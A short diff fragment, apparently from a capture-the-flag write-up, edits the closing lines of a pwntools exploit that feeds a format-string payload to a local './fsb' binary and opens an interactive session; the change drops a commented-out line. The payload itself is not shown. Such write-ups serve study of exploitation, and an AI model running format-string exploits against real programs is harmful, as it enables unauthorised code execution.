@@ -319,7 +319,6 @@ payload += fsa
 
 # pwn
 p = process(['./fsb', payload])
-# p = process(['./fsb', abuf])
 p.interactive()
 ```
 
